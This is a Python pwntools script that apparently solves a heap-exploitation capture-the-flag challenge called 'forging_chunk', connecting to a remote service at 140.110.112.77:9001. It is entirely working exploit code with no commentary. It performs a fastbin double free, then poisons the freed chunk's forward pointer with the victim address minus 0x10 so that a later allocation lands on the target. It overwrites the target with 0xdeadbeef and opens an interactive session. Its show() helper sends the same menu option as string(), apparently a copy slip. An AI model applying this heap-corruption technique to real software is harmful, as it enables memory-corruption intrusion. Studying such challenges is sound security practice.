from pwn import *

def free(index):
    global r
    raw_input('debug free {}'.format(index))
    r.recvuntil('input:')
    r.sendline('0')
    r.recvuntil('x =')
    r.sendline(str(index))

def malloc(index):
    global r
    raw_input('debug malloc {}'.format(index))
    r.recvuntil('input:')
    r.sendline('1')
    r.recvuntil('x =')
    r.sendline(str(index))

def string(index, data):
    global r
    raw_input('debug string {} {}'.format(index, data))
    r.recvuntil('input:')
    r.sendline('2')
    r.recvuntil('x =')
    r.sendline(str(index))
    r.recvuntil('string =')
    r.sendline(data)

def show(index):
    global r
    raw_input('debug show {}'.format(index))
    r.recvuntil('input:')
    r.sendline('2')
    r.recvuntil('x =')
    r.sendline(str(index))

#r = process('forging_chunk')
r = remote('140.110.112.77', 9001)
raw_input('debug:')
victim = int(r.recvline().split(':')[1].strip()[2:], 16)
size = int(r.recvline().split(':')[1].strip()[2:], 16)
print('victim: {}, size: {}'.format(hex(victim), hex(size)))

malloc(0)
string(0, 'a' * 8)
malloc(1)
string(1, 'b' * 8)
free(0)
free(1)
free(0)
malloc(0)
string(0, p64(victim - 0x10))
malloc(0)
malloc(0)
malloc(0)
string(0, p64(0xdeadbeef))
r.recvuntil('input:')
r.sendline('5')
r.interactive()
